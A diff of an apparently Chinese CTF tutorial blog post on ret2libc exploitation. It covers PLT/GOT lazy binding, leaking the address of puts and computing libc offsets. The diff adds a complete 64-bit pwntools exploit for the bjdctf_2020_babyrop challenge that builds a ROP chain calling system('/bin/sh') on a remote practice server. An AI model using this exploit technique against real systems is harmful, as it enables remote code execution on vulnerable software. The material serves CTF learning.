@@ -9,7 +9,7 @@ cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libcover.jpg"
 
 
 
-在上一篇博客，我们介绍了栈溢出基本原理（https://wutong01304.github.io/2023/07/05/stack/）。通过劫持返回地址，可以使程序转去执行我们构造好的system函数，进而执行攻击。但如果没有直接的后门，且没有直接发现system函数该怎么办呢？我们需要知道：system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。因此如果我们知道libc.so其中一个函数的地址，那么通过计算偏移，就可以得到system函数的地址。那么如何泄露libc中的函数地址呢？这就要利用linux的延迟绑定机制了。
+在上一篇博客，我们介绍了[栈溢出基本原理](https://wutong01304.github.io/2023/07/05/stack/)。 通过劫持返回地址，可以使程序转去执行我们构造好的system函数，进而执行攻击。但如果没有直接的后门，且没有直接发现system函数该怎么办呢？我们需要知道：system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。因此如果我们知道libc.so其中一个函数的地址，那么通过计算偏移，就可以得到system函数的地址。那么如何泄露libc中的函数地址呢？这就要利用linux的延迟绑定机制了。
 
 # 一、延迟绑定机制
 
@@ -119,7 +119,7 @@ objdump -d test
 
 ![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt7.png?x-oss-process=style/watermark)
 
-发现里面是**_dl_runtime_resolve**函数，其作用是在程序运行时动态解析符号（函数或变量）的地址，将在另外一篇文章中进行详细介绍：https://wutong01304.github.io/2023/07/15/ret2_dl_runtime_resolve/。
+发现里面是**_dl_runtime_resolve**函数，其作用是在程序运行时动态解析符号（函数或变量）的地址，将在另外一篇文章中进行详细介绍。
 
 总结出第一次调用函数寻找地址的过程：xxx@plt -> xxx@got -> xxx@plt -> 公共@plt -> _dl_runtime_resolve
 
@@ -135,6 +135,8 @@ objdump -d test
 
 # 二、ret2libc
 
+## 2.1 泄露流程
+
 在上述分析中，我们知道，在程序中调用一个函数时，实际上会跳转到 PLT 中的一个特殊地址，该地址会将控制权转移到 GOT 中的相应地址，并且在第一次调用时，GOT 中的地址会被更新为真实的函数地址。因此我们可以利用泄露某个函数的真实地址，动态链接库中的函数之间相对偏移是固定的，因此其它函数的地址也可以泄露，然后使程序流转到其它函数，从而达到攻击的目的。
 
 利用PLT和GOT泄露地址的大致流程如下（以**使用puts**函数泄露puts函数真实地址为例）：
@@ -143,6 +145,8 @@ objdump -d test
 2. 在程序执行到 puts 函数时，控制权将被转移到 PLT 中的 puts 地址，然后转移到 GOT 中的 puts 地址。
 3. puts 函数将在 GOT 中找到真实的 puts 函数地址并将其打印到屏幕上。
 4. 这样就可以在输出中获取 puts 函数的真实地址。
+
+## 2.2 32位 ret2libc
 
 例题：https://buuoj.cn/challenges#[OGeek2019]babyrop 。也可以去buuctf上找，题目名字：[OGeek2019]babyrop
 
@@ -250,6 +254,60 @@ p.interactive()
 
 <img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret4.png?x-oss-process=style/watermark" style="zoom:80%;" />
 
-64位 ret2libc 溢出和32位大致相同，要注意构造的溢出流程，要先通过pop_rdi将参数传递给rdi寄存器，再执行函数，溢出图如下。就不进行举例了。
+## 2.3 64位 ret2libc
+
+64位 ret2libc 溢出和32位大致相同，要注意构造的溢出流程，要先通过pop_rdi将参数传递给rdi寄存器，再执行函数，溢出图如下。
 
 <img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret6.png?x-oss-process=style/watermark" style="zoom:80%;" />
+
+例题：https://buuoj.cn/challenges#bjdctf_2020_babyrop ，题目名字：bjdctf_2020_babyrop
+
+反汇编发现 vuln 函数中的 read 函数可以溢出：
+
+<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret7.png?x-oss-process=style/watermark" style="zoom:80%;" />
+
+使用如下命令寻找pop rdi
+
+```shell
+ROPgadget --binary bjdctf_2020_babyrop --only 'pop|ret'
+```
+
+<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret8.png?x-oss-process=style/watermark" style="zoom:80%;" />
+
+exp：
+
+```python
+from pwn import*
+from LibcSearcher import*
+r=remote('node4.buuoj.cn',29333)
+elf=ELF('./bjdctf_2020_babyrop')
+
+main=0x04006AD
+pop_rdi=0x0400733
+ret=0x04004c9
+
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
+payload1='a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
+r.recvuntil("story!\n")
+r.sendline(payload1)
+
+puts_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
+print hex(puts_addr)
+
+libc=LibcSearcher('puts',puts_addr)
+offset=puts_addr-libc.dump('puts')
+binsh=offset+libc.dump('str_bin_sh')
+system=offset+libc.dump('system')
+
+payload2='a'*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
+r.recvuntil("story!\n")
+r.sendline(payload2)
+r.interactive()
+```
+
+由于使用了LibcSearch，找到了不同版本的libc，在这里选择一个能用的就可以了（可以一个个尝试）：
+
+<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret9.png?x-oss-process=style/watermark" style="zoom:80%;" />
+
+在这里，选择了第0个libc，成功获取flag。
